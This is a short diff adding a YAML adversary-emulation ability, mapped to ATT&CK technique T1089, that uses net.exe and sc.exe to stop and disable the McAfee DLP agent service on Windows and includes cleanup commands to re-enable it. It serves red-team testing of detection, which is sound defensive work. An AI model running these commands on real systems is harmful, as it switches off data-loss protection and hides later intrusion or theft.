@@ -1,0 +1,18 @@
+---
+
+- id: tacdefen-1089-AR11-1v00-200121075649
+  name: Disable Arbitrary Security Windows Service
+  description: .      With administrative rights, an adversary can disable Windows Services related to security products. 
+  tactic: defense-evasion
+  technique:
+    attack_id: T1089
+    name: Disabling Security Tools
+  platforms:
+    windows:
+      cmd:
+        command: |
+           net.exe stop McAfeeDLPAgentService
+           sc.exe config McAfeeDLPAgentService start= disabled
+        cleanup: |
+           sc.exe config McAfeeDLPAgentService start= auto
+           net.exe start McAfeeDLPAgentService
